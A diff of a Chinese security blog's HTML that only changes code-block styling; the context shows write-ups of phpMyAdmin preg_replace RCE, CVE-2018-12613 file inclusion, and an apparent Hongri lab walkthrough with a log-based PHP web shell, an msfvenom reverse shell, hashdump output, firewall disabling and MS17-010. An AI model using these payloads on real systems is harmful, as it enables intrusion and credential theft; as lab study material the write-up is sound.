 </span></span><span style="display:flex;"><span>$pattern<span style="color:#f92672">:</span> <span style="color:#a6e22e">要搜索的模式，可以是字符串或一个字符串数组。反斜杠定界符尽量不要使用，而是使用</span> <span style="color:#75715e"># 或者 ~
 </span></span></span><span style="display:flex;"><span>$replacement<span style="color:#f92672">:</span> <span style="color:#a6e22e">用于替换的字符串或字符串数组。</span>
@@ -894,7 +894,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 </span></span></code></pre></div><p>/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码(在适当的逆向引用替换完之后)。
 提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。
 例如,对于下面这个代码,访问h=phpinfo(),就能触发phpinfo页面</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/test/e&#34;</span>,<span style="color:#e6db74">&#39;phpinfo()&#39;</span>,<span style="color:#e6db74">&#34;jutst test&#34;</span>);
 </span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
 </span></span></span></code></pre></div><p>
@@ -931,7 +931,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_7.png" alt="" /></figure>
 <p>sql语句的内容如下</p></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> 
 </span></span><span style="display:flex;"><span>    PMA_Util::backquote(<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#66d9ef">column</span>),   <span style="color:#75715e">-- 获取列名并进行反引号处理
 </span></span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">1</span>,                              <span style="color:#75715e">-- 添加一个额外的列，该列用于存储替换后的值
 </span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">COUNT</span>(<span style="color:#f92672">*</span>)                        <span style="color:#75715e">-- 计算匹配的行数
@@ -975,7 +975,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/phpMyAdmin_4.0.x%e2%80%944.6.2_%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_image_15.png" alt="" /></figure>
 <p>find参数中传进去的%00也就是空字符,将拼接之后的/给截断了</p></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/0/e</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">/&#34;</span>,<span style="color:#e6db74">&#34;system(&#39;id&#39;)&#34;</span>,<span style="color:#e6db74">&#34;0/e</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>)
 </span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
 </span></span></span></code></pre></div><h2 id="漏洞修复">漏洞修复</h2>
@@ -1023,7 +1023,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 <h3 id="php文件包含">php文件包含</h3>
 <p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。
 文件包含相关函数</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>require<span style="color:#f92672">()</span><span style="color:#75715e">#函数出现错误的时候，会直接报错并退出程序的执行</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>require<span style="color:#f92672">()</span><span style="color:#75715e">#函数出现错误的时候，会直接报错并退出程序的执行</span>
 </span></span><span style="display:flex;"><span>require_once<span style="color:#f92672">()</span><span style="color:#75715e">#只包含一次</span>
 </span></span><span style="display:flex;"><span>include<span style="color:#f92672">()</span><span style="color:#75715e">#在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行</span>
 </span></span><span style="display:flex;"><span>include_once<span style="color:#f92672">()</span><span style="color:#75715e">#只包含一次</span>
@@ -1046,7 +1046,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 <a href="phpmyadmin-4_8_1%e8%bf%9c%e7%a8%8b%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e%ef%bc%88CVE-2018-12613%ef%bc%89.pdf">phpmyadmin-4_8_1远程文件包含漏洞（CVE-2018-12613）</a></p>
 <h2 id="漏洞分析">漏洞分析</h2>
 <p>简单来说就是phpmyadmin对用户传入的参数直接进行了包含,并且黑名单的检验不严格,可以绕过,从而导致了LFI</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">index</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">index</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// If we have a valid target, let&#39;s load that script instead
 </span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span> <span style="color:#66d9ef">empty</span>($_REQUEST[<span style="color:#e6db74">&#39;target&#39;</span>])
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_string</span>($_REQUEST[<span style="color:#e6db74">&#39;target&#39;</span>])
@@ -1063,7 +1063,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;import.php&#39;</span>, <span style="color:#e6db74">&#39;export.php&#39;</span>
 </span></span><span style="display:flex;"><span>);
 </span></span></code></pre></div><p>然后就是在phpmyadmin中,执行sql语句之后,会存储在session文件中,如果包含这个文件,就能让select里面的php代码被执行</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/index.php?target<span style="color:#f92672">=</span>db_sql.php?/../../../../../../../../etc/passwd
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/index.php?target<span style="color:#f92672">=</span>db_sql.php?/../../../../../../../../etc/passwd
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#Windows环境下利用需要对?进行编码</span>
 </span></span><span style="display:flex;"><span>/index.php?target<span style="color:#f92672">=</span>db_sql.php%253f/../../../../../../../../tmp/sess_21faa6130eaba2b5e04e313bfacc60d4
 </span></span></code></pre></div><h2 id="漏洞发现">漏洞发现</h2>
@@ -1147,7 +1147,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 <h3 id="端口扫描">端口扫描</h3>
 <p>win7机器是桥接在192.168.71.0/24这个子网的</p>
 <p>arp-scan扫描局域网内主机</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>~/workspace<span style="color:#f92672">]</span>$ sudo arp-scan -I eth5 -l
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>~/workspace<span style="color:#f92672">]</span>$ sudo arp-scan -I eth5 -l
 </span></span><span style="display:flex;"><span>Interface: eth5, type: EN10MB, MAC: f6:39:4a:3d:95:18, IPv4: 192.168.71.99
 </span></span><span style="display:flex;"><span>Starting arp-scan 1.10.0 with <span style="color:#ae81ff">256</span> hosts <span style="color:#f92672">(</span>https://github.com/royhills/arp-scan<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>192.168.71.79   00:0c:29:a7:c1:b2       VMware, Inc.
@@ -1156,7 +1156,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> packets received by filter, <span style="color:#ae81ff">0</span> packets dropped by kernel
 </span></span><span style="display:flex;"><span>Ending arp-scan 1.10.0: <span style="color:#ae81ff">256</span> hosts scanned in 2.108 seconds <span style="color:#f92672">(</span>121.44 hosts/sec<span style="color:#f92672">)</span>. <span style="color:#ae81ff">2</span> responded
 </span></span></code></pre></div><p>使用nmap来扫描一下这个主机</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜  workspace  sudo nmap -sS -Pn 192.168.71.79  -p- --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜  workspace  sudo nmap -sS -Pn 192.168.71.79  -p- --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>
 </span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-25 16:26 CST
 </span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.247.79
 </span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00054s latency<span style="color:#f92672">)</span>.
@@ -1186,7 +1186,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 </span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
 </span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">1</span> hop
 </span></span></code></pre></div><p>再对mysql扫一下</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜  workspace  sudo nmap -sS -Pn 192.168.71.79  -p3306 --script<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;*sql*&#34;</span>  --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜  workspace  sudo nmap -sS -Pn 192.168.71.79  -p3306 --script<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;*sql*&#34;</span>  --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>
 </span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-25 16:31 CST
 </span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.247.79
 </span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00034s latency<span style="color:#f92672">)</span>.
@@ -1208,7 +1208,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_6.png" alt="" /></figure>
 </p>
 <p>尝试在外面连接,连不上去</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜  workspace  mysql -h 192.168.71.79 -u root -p
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜  workspace  mysql -h 192.168.71.79 -u root -p
 </span></span><span style="display:flex;"><span>Enter password:
 </span></span></code></pre></div><p>扫目录发现存在phpmyadmin,phpstudy这玩意集成了phpmyadmin</p>
 <p>
@@ -1227,7 +1227,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_9.png" alt="" /></figure>
 </p>
 <p>启用日志功能,然后修改日志文件路径,这里的绝对路径是在php探针里面泄露的</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set global general_log <span style="color:#f92672">=</span> on;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set global general_log <span style="color:#f92672">=</span> on;
 </span></span><span style="display:flex;"><span>set global general_log_file<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;C:/phpStudy/WWW/shell.php&#39;</span>;
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#e6db74">&#34;&lt;?php @eval(</span>$_POST<span style="color:#e6db74">[&#39;123&#39;]);?&gt;&#34;</span>
 </span></span></code></pre></div><p>
@@ -1269,7 +1269,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_16.png" alt="" /></figure>
 </p>
 <p>域渗透信息收集checklist</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> ipconfig /all   <span style="color:#75715e"># 查看本机ip，所在域</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> ipconfig /all   <span style="color:#75715e"># 查看本机ip，所在域</span>
 </span></span><span style="display:flex;"><span> route print     <span style="color:#75715e"># 打印路由信息</span>
 </span></span><span style="display:flex;"><span> net view        <span style="color:#75715e"># 查看局域网内其他主机名</span>
 </span></span><span style="display:flex;"><span> arp -a          <span style="color:#75715e"># 查看arp缓存</span>
@@ -1321,14 +1321,14 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 <p>域控的ip为192.168.52.138</p>
 <h3 id="尝试rdp">尝试rdp</h3>
 <p>接下来在win7机器上增加用户，看能不能rdp上去</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>net user l1uyun aBc12@liuyun
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>net user l1uyun aBc12@liuyun
 </span></span><span style="display:flex;"><span>net localgroup administrators l1uyun /add
 </span></span></code></pre></div><p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_22.png" alt="" /></figure>
 </p>
 <p>查看3389端口是否开启,没有启动的话就手动启动一下</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>关闭防火墙
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>关闭防火墙
 </span></span><span style="display:flex;"><span>netsh advfirewall set allprofiles state off
 </span></span><span style="display:flex;"><span>查看是否开启
 </span></span><span style="display:flex;"><span>netstat -ano | find <span style="color:#e6db74">&#34;3389&#34;</span>
@@ -1344,7 +1344,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_24.png" alt="" /></figure>
 </p>
 <h3 id="msf上线">msf上线</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.71.101 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">10010</span> -f exe -o shell.exe
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.71.101 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">10010</span> -f exe -o shell.exe
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>msfconsole -q
 </span></span><span style="display:flex;"><span>use exploit/multi/handler 
@@ -1374,7 +1374,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 </p>
 <h3 id="收集凭据">收集凭据</h3>
 <p>获取hash</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; hashdump
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; hashdump
 </span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 </span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 </span></span><span style="display:flex;"><span>l1uyun:1009:aad3b435b51404eeaad3b435b51404ee:e632033e620c600f68dc60c32b103d8c:::
@@ -1398,7 +1398,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 </p>
 <h3 id="搭建socks隧道">搭建socks隧道</h3>
 <p>第一次使用msf来搭socks,之前都是在用frp</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>run post/multi/manage/autoroute        <span style="color:#75715e">#加载MSF的autoroute模块，获取当前机器的所有网段信息</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>run post/multi/manage/autoroute        <span style="color:#75715e">#加载MSF的autoroute模块，获取当前机器的所有网段信息</span>
 </span></span></code></pre></div><p>这里为啥要使用autoroute这个模块呢</p>
 <p>
 <figure class="md-figure">
@@ -1416,7 +1416,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 </p>
 <h3 id="主机探测">主机探测</h3>
 <p>使用arp-scanner模块进行内网的扫描</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use post/windows/gather/arp_scanner
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use post/windows/gather/arp_scanner
 </span></span><span style="display:flex;"><span>set RHOSTS 192.168.52.0/24
 </span></span><span style="display:flex;"><span>sessions  <span style="color:#75715e"># 查看session列表</span>
 </span></span><span style="display:flex;"><span>set session <span style="color:#ae81ff">1</span>
@@ -1436,14 +1436,14 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 </span></span></code></pre></div><p>当前机器的ip是192.168.52.143,域控的是192.168.52.138
 所以说目前内网里面有三台机器138,141,143</p>
 <p>还可以使用ping来做主机探测</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;for /L %I in <span style="color:#f92672">(</span>1,1,254<span style="color:#f92672">)</span> DO @ping -w <span style="color:#ae81ff">1</span> -n <span style="color:#ae81ff">1</span> 192.168.52.%I | findstr <span style="color:#e6db74">&#34;TTL=&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;for /L %I in <span style="color:#f92672">(</span>1,1,254<span style="color:#f92672">)</span> DO @ping -w <span style="color:#ae81ff">1</span> -n <span style="color:#ae81ff">1</span> 192.168.52.%I | findstr <span style="color:#e6db74">&#34;TTL=&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> /L %I in <span style="color:#f92672">(</span>1,1,254<span style="color:#f92672">)</span> DO @ping -w <span style="color:#ae81ff">1</span> -n <span style="color:#ae81ff">1</span> 192.168.52.%I | findstr <span style="color:#e6db74">&#34;TTL=&#34;</span>
 </span></span><span style="display:flex;"><span>���� 192.168.52.138 �Ļظ�: �ֽ�<span style="color:#f92672">=</span><span style="color:#ae81ff">32</span> ʱ��&lt;1ms TTL<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span>
 </span></span><span style="display:flex;"><span>���� 192.168.52.141 �Ļظ�: �ֽ�<span style="color:#f92672">=</span><span style="color:#ae81ff">32</span> ʱ��&lt;1ms TTL<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span>
 </span></span><span style="display:flex;"><span>���� 192.168.52.143 �Ļظ�: �ֽ�<span style="color:#f92672">=</span><span style="color:#ae81ff">32</span> ʱ��&lt;1ms TTL<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span>
 </span></span></code></pre></div><h3 id="端口扫描-1">端口扫描</h3>
 <p>扫一下域控的端口</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>windows/gather/arp_scanner<span style="color:#f92672">)</span> &gt; use auxiliary/scanner/portscan/tcp
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>windows/gather/arp_scanner<span style="color:#f92672">)</span> &gt; use auxiliary/scanner/portscan/tcp
 </span></span><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>scanner/portscan/tcp<span style="color:#f92672">)</span> &gt; show options
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>auxiliary/scanner/portscan/tcp<span style="color:#f92672">)</span>:
@@ -1485,7 +1485,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 </span></span></code></pre></div><p>445端口是开放的,扫一下永恒之蓝</p>
 <h3 id="ms17_010永恒之蓝">ms17_010永恒之蓝</h3>
 <p>这里可以确定域控机器上是有永恒之蓝的</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>scanner/smb/smb_ms17_010<span style="color:#f92672">)</span> &gt; run
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>scanner/smb/smb_ms17_010<span style="color:#f92672">)</span> &gt; run
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.52.138:445    - Host is likely VULNERABLE to MS17-010! - Windows Server <span style="color:#ae81ff">2008</span> R2 Datacenter <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> x64 <span style="color:#f92672">(</span>64-bit<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.52.138:445    - Scanned <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> hosts 
@@ -1507,7 +1507,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_37.png" alt="" /></figure>
 </p>
 <p>给管理员权限</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set COMMAND net localgroup administrators hack /add
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set COMMAND net localgroup administrators hack /add
 </span></span><span style="display:flex;"><span>set COMMAND net localgroup administrators
 </span></span></code></pre></div><p>
 <figure class="md-figure">
